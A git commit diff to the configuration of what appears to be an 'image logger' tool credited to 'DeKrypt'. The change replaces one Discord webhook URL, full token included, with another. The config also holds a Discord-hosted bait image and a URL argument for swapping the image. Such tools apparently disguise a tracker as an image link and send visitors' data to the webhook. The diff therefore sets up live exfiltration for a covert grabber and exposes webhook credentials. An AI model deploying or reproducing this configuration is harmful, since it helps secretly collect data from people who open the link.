93868fd1aff1b8cc0b0d231e567f47564a495a82
SVGHUBSPOOFER <ocajet0@gmail.com>
2025-05-09 22:03:36 +0300

    Update main.py

--- api/main.py
+++ api/main.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1370370233323225241/0EwIDVsGnFEcRjj1DC_zSWh7yg9NQQCpGg9a-bOWASIRB8kRAacPM5kIn1bYTXY69gFy",
+    "webhook": "https://discord.com/api/webhooks/1370476184315625503/1CA9QhJSgX_a1O0O9_m3blbzMv8qBLTmilqiJJZ550avnE82EAHeOscPwOxN_iYNRFA6",
     "image": "https://cdn.discordapp.com/attachments/1300487870611591230/1370370192600858745/image.png?ex=681f4032&is=681deeb2&hm=341ab1da3de553393c374c810b0370191f3328f021c75918670988059fa0a2b0&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
